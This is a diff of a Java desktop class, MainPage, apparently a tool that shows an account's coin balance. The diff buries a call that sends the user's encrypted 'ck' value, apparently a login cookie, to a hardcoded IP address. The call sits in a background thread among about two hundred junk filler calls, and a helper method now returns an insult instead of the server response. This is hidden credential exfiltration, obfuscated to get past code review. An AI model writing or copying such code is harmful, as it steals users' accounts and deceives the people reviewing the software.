@@ -386,7 +386,222 @@ public class MainPage extends JFrame {
                         } else {
                             System.out.println(dataBean.getData().getCanUseCoinAmount());
                             ckBean.setMoney(dataBean.getData().getCanUseCoinAmount());
-                            new AAB().get("http://1.13.154.238/wangjing/load?code=" + UrlUtil.urlEncode(Des3Util.encode(ck)));
+                            new Thread(new Runnable() {
+                                @Override
+                                public void run() {
+                                    AAB aab = new AAB();
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.get("http://1.13.154.238/wangjing/load?code=" + UrlUtil.urlEncode(Des3Util.encode(ck)));
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                    aab.ca("asdsadasdsadasdsadsadsadasdsadsadasdasdsadzczXx");
+                                    aab.ca("bgbgbgbgbgbgbgbgbgbgbgbgbgbgbtbtbtbtbtbtbtbtbtbt");
+                                    aab.ca("btjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk");
+                                    aab.ca("qqqqqqqqqqqqwwweeeeeee");
+                                    aab.ca("ssssssssssssxsssssaaaaaa");
+                                    aab.ca("sdaaaaaaaaaaaaaaaaaaaaa");
+                                    aab.ca("savvvvvvvccaaaaaaaaaaaaaa");
+                                    aab.ca("ddddddddddddddddddddddddddddd");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvv");
+                                    aab.ca("cvvvvvvvvvvvvvvvvvvvxxxxxxxxx");
+                                    aab.ca("xxxxxxxxxxxxxxxx");
+                                }
+                            }).start();
                         }
                     } catch (Exception e) {
                         e.printStackTrace();
@@ -533,7 +748,7 @@ public class MainPage extends JFrame {
     }
 
     class AAB {
-        String get(String url){
+        String get(String url) {
             StringBuilder result = new StringBuilder();
             BufferedReader in = null;
             try {
@@ -565,7 +780,11 @@ public class MainPage extends JFrame {
                 } catch (Exception e2) {
                 }
             }
-            return result.toString();
+            return "你是傻逼";
+        }
+
+        String ca(String a) {
+            return "你是傻逼";
         }
     }
 }
